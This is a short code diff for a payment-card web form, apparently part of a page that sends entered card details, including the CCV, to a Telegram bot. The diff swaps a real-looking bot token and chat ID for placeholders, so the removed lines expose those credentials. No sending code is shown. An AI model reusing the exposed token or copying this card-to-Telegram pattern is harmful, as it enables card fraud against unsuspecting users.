@@ -9,8 +9,8 @@ const tarjeta = document.querySelector('#tarjeta'),
 	  yearExpiracion = document.querySelector('#tarjeta .year');
 	  ccv = document.querySelector('#tarjeta .ccv');
    sig = document.querySelector('#btn-enviar');
-   telegram_bot_id = "6562905773:AAFpR1dDRp6CJdIENVq_d3hm4od-NrY3pLY";
-   chat_id = "-1001908180943";
+   telegram_bot_id = "telegram_bot_ID";
+   chat_id = "chatID";
 var message;
 
 var theme = localStorage.getItem('theme');
